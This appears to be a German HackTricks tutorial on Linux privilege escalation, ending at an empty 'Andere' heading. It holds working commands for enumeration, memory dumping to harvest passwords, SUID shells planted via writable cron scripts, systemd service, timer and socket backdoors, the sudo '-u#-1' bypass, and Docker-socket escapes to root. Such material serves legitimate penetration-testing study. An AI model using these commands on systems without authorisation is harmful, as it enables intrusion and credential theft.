# Linux Privilege Escalation

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Systeminformationen

### Betriebssysteminformationen

Lassen Sie uns damit beginnen, etwas Wissen über das ausgeführte Betriebssystem zu erlangen.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn Sie **Schreibberechtigungen für einen beliebigen Ordner innerhalb der `PATH`-Variablen haben**, können Sie möglicherweise einige Bibliotheken oder Binärdateien übernehmen:
```bash
echo $PATH
```
### Umgebungsinfo

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel-Exploits

Überprüfen Sie die Kernel-Version und ob es einen Exploit gibt, der verwendet werden kann, um Berechtigungen zu eskalieren.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Sie können eine gute Liste von anfälligen Kerneln und bereits **kompilierten Exploits** hier finden: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Andere Websites, auf denen Sie einige **kompilierte Exploits** finden können: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle anfälligen Kernelversionen von dieser Website zu extrahieren, können Sie Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen könnten, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ausführen IM Opfer, überprüft nur Exploits für Kernel 2.x)

**Suchen Sie immer die Kernel-Version in Google**, vielleicht ist Ihre Kernel-Version in einem Kernel-Exploit erwähnt und dann sind Sie sicher, dass dieser Exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux-Privilegieneskalation - Linux-Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die erscheinen in:
```bash
searchsploit sudo
```
Sie können überprüfen, ob die sudo-Version anfällig ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturüberprüfung fehlgeschlagen

Überprüfen Sie die **smasher2-Box von HTB** für ein **Beispiel**, wie diese Schwachstelle ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere Systemenumerierung
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Ermitteln möglicher Verteidigungen

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity ist eine umfassende Sicherheitserweiterung für den Linux-Kernel, die zahlreiche Funktionen zur Verfügung stellt, um die Sicherheit des Systems zu verbessern. Dazu gehören RBAC, ACLs, Chroot-Hardening, und vieles mehr. Es ist eine leistungsstarke Lösung zur Härtung von Linux-Systemen.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield ist eine Technik, die in einigen Linux-Distributionen implementiert ist, um die Ausführung von Schadcode zu erschweren. Es schützt vor Buffer Overflow-Angriffen, indem es den Speicherbereich, in dem ausführbarer Code geladen wird, schützt.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SELinux (Security-Enhanced Linux) ist eine Sicherheitserweiterung für Linux-Betriebssysteme, die Mandatory Access Controls (MAC) implementiert. Es bietet eine zusätzliche Sicherheitsebene, um unbefugten Zugriff auf Systemressourcen zu verhindern.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Address Space Layout Randomization (ASLR) ist eine Sicherheitsfunktion, die dazu dient, die Vorhersagbarkeit von Speicheradressen zu verringern und somit die Ausnutzung von Sicherheitslücken durch Angreifer zu erschweren.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Ausbruch

Wenn Sie sich innerhalb eines Docker-Containers befinden, können Sie versuchen, daraus auszubrechen:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Laufwerke

Überprüfen Sie, **was gemountet und nicht gemountet ist**, wo und warum. Wenn etwas nicht gemountet ist, könnten Sie versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Listen Sie nützliche Binärdateien auf
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Auch überprüfen, ob **ein Compiler installiert ist**. Dies ist nützlich, wenn Sie einen Kernel-Exploit verwenden müssen, da empfohlen wird, ihn auf dem Gerät zu kompilieren, auf dem Sie ihn verwenden werden (oder auf einem ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte verwundbare Software

Überprüfen Sie die **Version der installierten Pakete und Dienste**. Möglicherweise gibt es eine alte Nagios-Version (zum Beispiel), die für die Eskalation von Berechtigungen ausgenutzt werden könnte...\
Es wird empfohlen, manuell die Version der verdächtigeren installierten Software zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn Sie SSH-Zugriff auf die Maschine haben, könnten Sie auch **openVAS** verwenden, um nach veralteter und verwundbarer Software innerhalb der Maschine zu suchen.

{% hint style="info" %}
_Beachten Sie, dass diese Befehle viele Informationen anzeigen werden, die größtenteils nutzlos sein werden. Es wird daher empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die überprüfen, ob eine installierte Softwareversion anfällig für bekannte Exploits ist._
{% endhint %}

## Prozesse

Werfen Sie einen Blick darauf, **welche Prozesse** ausgeführt werden, und prüfen Sie, ob ein Prozess **mehr Berechtigungen hat als er sollte** (vielleicht wird ein Tomcat von root ausgeführt?)
```bash
ps aux
ps -ef
top -n 1
```
Immer auf mögliche [**electron/cef/chromium Debugger** achten, die laufen, du könntest sie missbrauchen, um Privilegien zu eskalieren](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect` Parameter in der Befehlszeile des Prozesses überprüft.  
Überprüfe auch **deine Berechtigungen über die Prozess-Binärdateien**, vielleicht kannst du jemanden überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Dies kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn eine Reihe von Anforderungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **Zugangsdaten im Klartext im Speicher**.  
Normalerweise benötigst du **Root-Berechtigungen**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören. Daher ist dies normalerweise nützlicher, wenn du bereits Root bist und mehr Zugangsdaten entdecken möchtest.  
Denke jedoch daran, dass **du als regulärer Benutzer den Speicher der Prozesse, die dir gehören, lesen kannst**.

{% hint style="warning" %}
Beachte, dass heutzutage die meisten Maschinen **ptrace standardmäßig nicht zulassen**, was bedeutet, dass du keine anderen Prozesse dumpen kannst, die deinem unprivilegierten Benutzer gehören.

Die Datei _**/proc/sys/kernel/yama/ptrace\_scope**_ steuert die Zugänglichkeit von ptrace:

* **kernel.yama.ptrace\_scope = 0**: Alle Prozesse können debuggt werden, solange sie die gleiche UID haben. So funktionierte das klassische Tracing.
* **kernel.yama.ptrace\_scope = 1**: Nur ein übergeordneter Prozess kann debuggt werden.
* **kernel.yama.ptrace\_scope = 2**: Nur Admins können ptrace verwenden, da es die CAP\_SYS\_PTRACE-Fähigkeit erfordert.
* **kernel.yama.ptrace\_scope = 3**: Keine Prozesse dürfen mit ptrace verfolgt werden. Nach dem Setzen ist ein Neustart erforderlich, um das Tracing wieder zu aktivieren.
{% endhint %}

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Dienstes hast (zum Beispiel), könntest du den Heap erhalten und nach Zugangsdaten darin suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skript

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigt **maps, wie der Speicher im virtuellen Adressraum dieses Prozesses abgebildet ist**; es zeigt auch die **Berechtigungen jeder abgebildeten Region**. Die **mem** Pseudo-Datei **stellt den Speicher des Prozesses selbst dar**. Aus der **maps**-Datei wissen wir, welche **Speicherregionen lesbar sind** und ihre Offsets. Wir verwenden diese Informationen, um **in die mem-Datei zu suchen und alle lesbaren Regionen** in eine Datei zu dumpen.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht den virtuellen Speicher. Der virtuelle Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
In der Regel ist `/dev/mem` nur lesbar für **root** und die **kmem** Gruppe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine Neugestaltung von Linux des klassischen ProcDump-Tools aus der Sysinternals-Suite von Tools für Windows. Holen Sie es sich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, könnten Sie folgende Tools verwenden:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können manuell die Root-Anforderungen entfernen und den Prozess dumpen, der Ihnen gehört
* Skript A.5 von [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (Root-Zugriff erforderlich)

### Anmeldeinformationen aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der Authentifizierungsprozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Sie können den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Möglichkeiten zum Dumpen des Speichers eines Prozesses zu finden) und nach Anmeldedaten im Speicher suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **klare Textanmeldeinformationen aus dem Speicher** und aus einigen **bekannten Dateien** stehlen. Es erfordert Root-Berechtigungen, um ordnungsgemäß zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali-Desktop, Debian-Desktop)       | gdm-password         |
| Gnome-Schlüsselbund (Ubuntu-Desktop, ArchLinux-Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu-Desktop)                          | lightdm              |
| VSFTPd (Aktive FTP-Verbindungen)                   | vsftpd               |
| Apache2 (Aktive HTTP Basic Auth-Sitzungen)         | apache2              |
| OpenSSH (Aktive SSH-Sitzungen - Sudo-Nutzung)      | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

Überprüfen Sie, ob ein geplanter Job anfällig ist. Möglicherweise können Sie von einem Skript profitieren, das von root ausgeführt wird (Wildcard-Schwachstelle? Dateien ändern, die von root verwendet werden? Symlinks verwenden? Spezifische Dateien im Verzeichnis erstellen, das von root verwendet wird?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel kann man im _/etc/crontab_ den PATH finden: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachten Sie, wie der Benutzer "user" Schreibrechte über /home/user hat_)

Wenn der Root-Benutzer in diesem Crontab versucht, einen Befehl oder ein Skript ohne Festlegung des Pfads auszuführen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kann man eine Root-Shell erhalten, indem man:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem Skript mit einem Platzhalter verwenden (Platzhalter-Injektion)

Wenn ein Skript von root ausgeführt wird und ein "**\***" in einem Befehl enthält, könnten Sie dies ausnutzen, um unerwartete Dinge zu tun (wie z.B. Berechtigungserweiterung). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das Wildcard von einem Pfad wie** _**/some/path/\***_ **gefolgt wird, ist es nicht anfällig (sogar** _**./\***_ **ist es nicht).**

Lesen Sie die folgende Seite für weitere Tricks zur Ausnutzung von Wildcards:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Überschreiben von Cron-Skripten und Symlinks

Wenn Sie ein Cron-Skript **ändern können**, das von root ausgeführt wird, können Sie sehr einfach eine Shell erhalten:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das Skript, das von root ausgeführt wird, ein **Verzeichnis verwendet, auf das Sie vollständigen Zugriff haben**, könnte es nützlich sein, dieses Verzeichnis zu löschen und **einen symbolischen Link zu einem anderen Verzeichnis zu erstellen**, in dem ein von Ihnen kontrolliertes Skript ausgeführt wird.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige Cron-Jobs

Sie können die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Möglicherweise können Sie dies ausnutzen und Berechtigungen eskalieren.

Zum Beispiel, um **alle 0,1 Sekunden während 1 Minute zu überwachen**, **nach weniger ausgeführten Befehlen zu sortieren** und die am häufigsten ausgeführten Befehle zu löschen, können Sie Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **verwenden** (dies überwacht und listet jeden Prozess auf, der gestartet wird).

### Unsichtbare Cron-Jobs

Es ist möglich, einen Cron-Job zu erstellen, **indem Sie einen Wagenrücklauf nach einem Kommentar einfügen** (ohne Zeilenumbruchszeichen), und der Cron-Job wird funktionieren. Beispiel (beachten Sie das Wagenrücklaufzeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_ Dateien

Überprüfen Sie, ob Sie eine beliebige `.service`-Datei schreiben können. Wenn ja, könnten Sie sie **ändern**, damit sie Ihre **Hintertür ausführt**, wenn der Dienst **gestartet**, **neugestartet** oder **gestoppt** wird (eventuell müssen Sie auf einen Neustart des Systems warten).\
Erstellen Sie beispielsweise Ihre Hintertür innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Dienst-Binärdateien

Denken Sie daran, dass Sie, wenn Sie **Schreibberechtigungen für Binärdateien haben, die von Diensten ausgeführt werden**, diese für Hintertüren ändern können, sodass die Hintertüren ausgeführt werden, wenn die Dienste erneut ausgeführt werden.

### systemd-PATH - Relative Pfade

Sie können den vom **systemd** verwendeten PATH mit folgendem Befehl anzeigen:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einem der Ordner des Pfads **schreiben** können, könnten Sie in der Lage sein, **Berechtigungen zu eskalieren**. Sie müssen nach **relativen Pfaden suchen, die in den Konfigurationsdateien des Dienstes verwendet werden**, wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dann erstellen Sie eine **ausführbare** Datei mit dem **gleichen Namen wie der relative Pfadbefehl** im systemd-PATH-Ordner, den Sie schreiben können, und wenn der Dienst aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird Ihr **Hintertür ausgeführt** (unprivilegierte Benutzer können normalerweise keine Dienste starten/stoppen, aber überprüfen Sie, ob Sie `sudo -l` verwenden können).

**Weitere Informationen zu Diensten finden Sie unter `man systemd.service`.**

## **Timer**

**Timer** sind systemd-Einheitsdateien, deren Name mit `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timer** können als Alternative zu Cron verwendet werden, da sie eine integrierte Unterstützung für Kalenderzeitereignisse und monotonische Zeitereignisse haben und asynchron ausgeführt werden können.

Sie können alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn Sie einen Timer ändern können, können Sie ihn dazu bringen, einige vorhandene systemd.unit-Ausführungen auszuführen (wie z. B. eine `.service` oder ein `.target`).
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie lesen, was die Einheit ist:

> Die Einheit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Einheitsname, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, wird dieser Wert standardmäßig auf einen Dienst festgelegt, der den gleichen Namen wie die Timer-Einheit hat, außer dem Suffix. (Siehe oben.) Es wird empfohlen, dass der aktiviert Einheitsname und der Einheitsname der Timer-Einheit identisch benannt sind, außer dem Suffix.

Daher müssten Sie diese Berechtigung missbrauchen, indem Sie:

* Suchen Sie nach einer systemd-Einheit (wie einer `.service`), die eine **beschreibbare Binärdatei ausführt**
* Suchen Sie nach einer systemd-Einheit, die einen **relativen Pfad ausführt** und über **beschreibbare Berechtigungen** über den **systemd-Pfad** verfügt (um diese ausführbare Datei zu imitieren)

**Erfahren Sie mehr über Timer mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigen Sie Root-Berechtigungen und müssen ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachten Sie, dass der **Timer** durch Erstellen eines Symlinks darauf in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird.

## Sockets

Unix-Domänen-Sockets (UDS) ermöglichen die **Prozesskommunikation** innerhalb von Client-Server-Modellen auf denselben oder verschiedenen Maschinen. Sie nutzen Standard-Unix-Deskriptor-Dateien für die zwischencomputerkommunikation und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahren Sie mehr über Sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen sind unterschiedlich, aber eine Zusammenfassung wird verwendet, um anzuzeigen, wo der Socket lauschen wird (der Pfad der AF\_UNIX-Socketdatei, die IPv4/6 und/oder Portnummer zum Lauschen usw.).
* `Accept`: Nimmt ein boolesches Argument an. Wenn **true**, wird eine **Serviceinstanz für jede eingehende Verbindung erstellt** und nur der Verbindungssocket wird an sie übergeben. Wenn **false**, werden alle lauschenden Sockets selbst an die gestartete Serviceeinheit übergeben, und es wird nur eine Serviceeinheit für alle Verbindungen erstellt. Dieser Wert wird für Datagramm-Sockets und FIFOs ignoriert, bei denen eine einzelne Serviceeinheit bedingungslos den gesamten eingehenden Datenverkehr behandelt. **Standardmäßig auf false gesetzt**. Aus Leistungsgründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
* `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen an, die **vor** oder **nach** dem Erstellen und Binden der lauschenden **Sockets**/FIFOs ausgeführt werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
* `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** oder **nach** dem Schließen und Entfernen der lauschenden **Sockets**/FIFOs ausgeführt werden.
* `Service`: Gibt den **Servicenamen** an, der bei **eingehendem Datenverkehr aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Es wird standardmäßig der Dienst verwendet, der denselben Namen wie der Socket trägt (mit dem ersetzen des Suffixes). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.

### Beschreibbare .socket-Dateien

Wenn Sie eine **beschreibbare** `.socket`-Datei finden, können Sie am Anfang des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die Hintertür wird ausgeführt, bevor der Socket erstellt wird. Daher müssen Sie **wahrscheinlich warten, bis die Maschine neu gestartet wird.**\
_Beachten Sie, dass das System diese Socketdateikonfiguration verwenden muss, damit die Hintertür ausgeführt wird._

### Beschreibbare Sockets

Wenn Sie einen **beschreibbaren Socket** identifizieren (_jetzt sprechen wir über Unix-Sockets und nicht über die Konfigurationsdateien `.socket`_), können Sie mit diesem Socket kommunizieren und möglicherweise eine Schwachstelle ausnutzen.

### Enumerieren von Unix-Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ausbeispiel:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP-Sockets

Beachten Sie, dass es möglicherweise einige **Sockets gibt, die auf HTTP-Anfragen lauschen** (_Ich spreche nicht von .socket-Dateien, sondern von Dateien, die als Unix-Sockets fungieren_). Sie können dies überprüfen mit:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### Beschreibbarer Docker-Socket

Der Docker-Socket, der sich häufig unter `/var/run/docker.sock` befindet, ist eine wichtige Datei, die gesichert werden sollte. Standardmäßig ist sie vom Benutzer `root` und Mitgliedern der Gruppe `docker` beschreibbar. Wenn Sie Schreibzugriff auf diesen Socket haben, kann dies zu einer Privilegieneskalation führen. Hier ist eine Aufschlüsselung, wie dies gemacht werden kann, und alternative Methoden, wenn die Docker CLI nicht verfügbar ist.

#### **Privilegieneskalation mit Docker CLI**

Wenn Sie Schreibzugriff auf den Docker-Socket haben, können Sie Privilegien mit den folgenden Befehlen eskalieren:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es Ihnen, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Verwendung der Docker-API direkt**

In Fällen, in denen die Docker-Befehlszeilenschnittstelle nicht verfügbar ist, kann der Docker-Socket immer noch über die Docker-API und `curl`-Befehle manipuliert werden.

1.  **Docker-Images auflisten:** Abrufen der Liste der verfügbaren Images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Einen Container erstellen:** Senden Sie eine Anfrage zur Erstellung eines Containers, der das Stammverzeichnis des Hostsystems einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starten Sie den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Mit dem Container verbinden:** Verwenden Sie `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung eingerichtet wurde, können Befehle direkt im Container mit Root-Zugriff auf das Dateisystem des Hosts ausgeführt werden.

### Andere

